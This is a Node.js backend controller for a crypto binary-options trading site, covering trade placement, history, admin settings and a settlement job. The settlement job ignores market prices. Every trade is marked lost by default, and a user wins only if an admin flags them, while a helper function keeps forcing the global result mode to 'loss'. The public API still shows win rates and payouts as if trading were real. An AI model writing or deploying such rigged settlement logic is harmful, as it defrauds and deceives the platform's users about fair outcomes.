const BinaryTrade    = require('../models/BinaryTrade');
const BinarySettings = require('../models/BinarySettings');
const User           = require('../models/User');
const { getCoinPrice } = require('../utils/priceService');

// ─── Helper: get or create settings ─────────────────────────────────────────
const getSettings = async () => {
  let s = await BinarySettings.findOne();
  if (!s) s = await BinarySettings.create({});
  if (s.forceResultMode !== 'loss') {
    s.forceResultMode = 'loss';
    await s.save();
  }
  return s;
};

// ─── GET /api/binary/settings (public) ──────────────────────────────────────
exports.getPublicSettings = async (req, res) => {
  try {
    const s = await getSettings();
    res.json({
      tradingEnabled:  s.tradingEnabled,
      maintenanceMode: s.maintenanceMode,
      demoModeEnabled: s.demoModeEnabled,
      payoutRate:      s.payoutRate,
      minTradeAmount:  s.minTradeAmount,
      maxTradeAmount:  s.maxTradeAmount,
      expiryTimes:     s.expiryTimes,
      availablePairs:  s.availablePairs,
      drawBehavior:    s.drawBehavior,
      winRates:        s.forceWinRates || { '20': 0.10, '30': 0.20, '60': 0.30, '90': 0.50, '180': 0.70 },
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

// ─── POST /api/binary/place ──────────────────────────────────────────────────
exports.placeTrade = async (req, res) => {
  try {
    const { coin, direction, amount, duration } = req.body;

    if (!coin || !direction || !amount || !duration)
      return res.status(400).json({ error: 'Missing required fields' });
    if (!['up', 'down'].includes(direction))
      return res.status(400).json({ error: 'Invalid direction' });

    const s = await getSettings();

    if (!s.tradingEnabled || s.maintenanceMode)
      return res.status(403).json({ error: 'Trading is currently disabled' });
    if (!s.availablePairs.includes(coin.toUpperCase()))
      return res.status(400).json({ error: 'Trading pair not available' });
    if (!s.expiryTimes.includes(Number(duration)))
      return res.status(400).json({ error: 'Invalid expiry time' });

    const tradeAmount = parseFloat(amount);
    if (isNaN(tradeAmount) || tradeAmount < s.minTradeAmount)
      return res.status(400).json({ error: `Minimum trade amount is $${s.minTradeAmount}` });

    const user = await User.findById(req.user._id);
    const balanceField = 'demo_balance';

    if (user[balanceField] < tradeAmount)
      return res.status(400).json({ error: 'Insufficient balance' });

    // Get live entry price
    const priceData = await getCoinPrice(coin.toUpperCase());
    if (!priceData) return res.status(400).json({ error: 'Could not fetch price for this coin' });

    // Deduct balance
    user[balanceField] -= tradeAmount;
    await user.save();

    const expiresAt = new Date(Date.now() + Number(duration) * 1000);

    const trade = await BinaryTrade.create({
      user:       req.user._id,
      coin:       coin.toUpperCase(),
      direction,
      amount:     tradeAmount,
      entryPrice: priceData.price,
      duration:   Number(duration),
      expiresAt,
      payoutRate: s.payoutRate,
    });

    res.json({
      success:    true,
      trade:      trade,
      entryPrice: priceData.price,
      expiresAt,
    });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

// ─── GET /api/binary/active ──────────────────────────────────────────────────
exports.getActiveTrades = async (req, res) => {
  try {
    const trades = await BinaryTrade.find({
      user:   req.user._id,
      status: 'active',
    }).sort({ createdAt: -1 }).limit(20);
    res.json({ trades });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

// ─── GET /api/binary/history ─────────────────────────────────────────────────
exports.getTradeHistory = async (req, res) => {
  try {
    const limit = parseInt(req.query.limit) || 30;
    const page  = parseInt(req.query.page)  || 1;
    const trades = await BinaryTrade.find({
      user:   req.user._id,
      status: { $in: ['won', 'lost'] },
    }).sort({ createdAt: -1 }).limit(limit).skip((page - 1) * limit);
    const total = await BinaryTrade.countDocuments({ user: req.user._id, status: { $in: ['won', 'lost'] } });
    res.json({ trades, total });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

// ─── Admin: GET /api/binary/admin/settings ───────────────────────────────────
exports.adminGetSettings = async (req, res) => {
  try {
    const s = await getSettings();
    res.json(s);
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

// ─── Admin: PUT /api/binary/admin/settings ───────────────────────────────────
exports.adminUpdateSettings = async (req, res) => {
  try {
    let s = await BinarySettings.findOne();
    if (!s) s = new BinarySettings();
    const allowed = [
      'tradingEnabled', 'maintenanceMode', 'demoModeEnabled', 'defaultDemoBalance',
      'payoutRate', 'minTradeAmount', 'maxTradeAmount', 'expiryTimes',
      'availablePairs', 'drawBehavior', 'resultSource',
      'forceWinRates',
    ];
    for (const key of allowed) {
      if (req.body[key] !== undefined) s[key] = req.body[key];
    }
    s.forceResultMode = 'loss';
    await s.save();
    res.json({ success: true, settings: s });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

// ─── Admin: GET /api/binary/admin/trades ─────────────────────────────────────
exports.adminGetAllTrades = async (req, res) => {
  try {
    const page  = parseInt(req.query.page) || 1;
    const limit = 30;
    const trades = await BinaryTrade.find()
      .populate('user', 'username email')
      .sort({ createdAt: -1 })
      .limit(limit)
      .skip((page - 1) * limit);
    const total = await BinaryTrade.countDocuments();
    res.json({ trades, total });
  } catch (err) {
    res.status(500).json({ error: err.message });
  }
};

// ─── Settlement Job (runs every 3 seconds) ───────────────────────────────────
exports.startBinaryTradeSettlementJob = () => {
  console.log('⚡ Binary trade settlement job started');

  setInterval(async () => {
    try {
      const now = new Date();
      const expired = await BinaryTrade.find({
        status:    'active',
        expiresAt: { $lte: now },
      }).populate('user');

      if (expired.length === 0) return;

      const s = await getSettings();

      for (const trade of expired) {
        try {
          const priceData = await getCoinPrice(trade.coin);
          if (!priceData) continue;

          const closePrice = priceData.price;
          trade.closePrice = closePrice;

          // ── Resolve per-user mode ────────────────────────────────
          // trade.user is populated (User doc) from .populate('user') above
          const tradeUser  = trade.user;
          const userMode   = tradeUser?.tradeMode || 'loss';   // default: loss
          const userRates  = tradeUser?.tradeWinRates || s.forceWinRates ||
                             { '20': 0.10, '30': 0.20, '60': 0.30, '90': 0.50, '180': 0.70 };

          let status, profit;

          if (userMode === 'win') {
            // ── User-specific WIN ──────────────────────────────────
            const rate = userRates[String(trade.duration)] ?? 0.10;
            status = 'won';
            profit = parseFloat((trade.amount * rate).toFixed(2));

          } else {
            // ── User-specific LOSE (default) ──────────────────────
            status = 'lost';
            profit = -trade.amount;
          }

          trade.status = status;
          trade.profit = profit;
          await trade.save();

          // Update user balance
          const user = await User.findById(trade.user._id);
          if (user) {
            if (status === 'won') {
              user.demo_balance += trade.amount + profit; // return stake + profit
            }
            await user.save();
          }
        } catch (innerErr) {
          console.error('Settlement error for trade', trade._id, innerErr.message);
        }
      }
    } catch (err) {
      console.error('Settlement job error:', err.message);
    }
  }, 3000);
};
